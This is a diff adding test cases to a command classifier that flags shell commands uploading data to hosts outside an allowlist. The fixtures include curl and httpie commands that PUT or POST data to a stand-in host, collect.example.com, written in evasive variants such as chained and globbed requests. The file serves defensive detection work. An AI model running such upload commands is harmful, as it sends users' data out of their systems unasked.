@@ -51,6 +51,15 @@ describe("one fixture per bash.egress spelling", () => {
     ]);
   });
 
+  it.each([
+    ["a run-time curl method", 'curl -X "$M" https://collect.example.com/in', "bash.egress.curl-upload", "collect.example.com"],
+    ["a lower-case httpie method", "http put https://collect.example.com/in", "bash.egress.httpie", "collect.example.com"],
+    ["a write in a later curl request", "curl https://api.github.com/x --next -X PUT https://collect.example.com/in", "bash.egress.curl-upload", "collect.example.com"],
+    ["a globbed curl URL", "curl -d x 'https://collect.example.com/in[1-2]'", "bash.egress.curl-upload", "collect.example.com"],
+  ])("reads %s as an upload", (_what, command, spelling, host) => {
+    expect(bash(command).filter((a) => a.action === "private-egress")).toEqual([expect.objectContaining({ spelling, subject: { host } })]);
+  });
+
   it("names each distinct off-allowlist host once", () => {
     expect(bash("curl -d x https://a.example.com/1 https://a.example.com/2 https://api.github.com/x").map((a) => a.subject)).toEqual([
       { host: "a.example.com" },
